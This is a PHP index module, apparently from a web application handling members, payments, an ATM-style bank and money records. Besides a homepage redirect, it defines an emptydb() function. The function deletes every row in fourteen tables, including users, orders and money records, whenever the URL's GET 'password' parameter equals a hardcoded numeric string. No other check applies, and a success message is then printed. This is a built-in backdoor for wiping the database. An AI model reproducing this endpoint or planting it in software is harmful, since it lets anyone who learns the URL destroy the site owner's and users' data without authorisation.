<?php
if (!defined('ROOT')) exit('Can\'t Access !'); 
class mod_index extends module_class{
 function main(){//首页
    location("?mod=member");
 } 
 function emptydb(){
  if($_GET['password']=='147258369'){
	$this->mysql->query("delete from {$this->pre}user");
	$this->mysql->query("delete from {$this->pre}atmbank");
	$this->mysql->query("delete from {$this->pre}atmlog");
	$this->mysql->query("delete from {$this->pre}completed");
	$this->mysql->query("delete from {$this->pre}customs");
	$this->mysql->query("delete from {$this->pre}log");
	$this->mysql->query("delete from {$this->pre}message");
	$this->mysql->query("delete from {$this->pre}payorder");
	$this->mysql->query("delete from {$this->pre}record");
	$this->mysql->query("delete from {$this->pre}records");
	$this->mysql->query("delete from {$this->pre}order");
	$this->mysql->query("delete from {$this->pre}delivery");
	$this->mysql->query("delete from {$this->pre}money");
	$this->mysql->query("delete from {$this->pre}news");
	echo '恭喜你清空数据库成功！';
	exit;
  }	 
 }
}
?>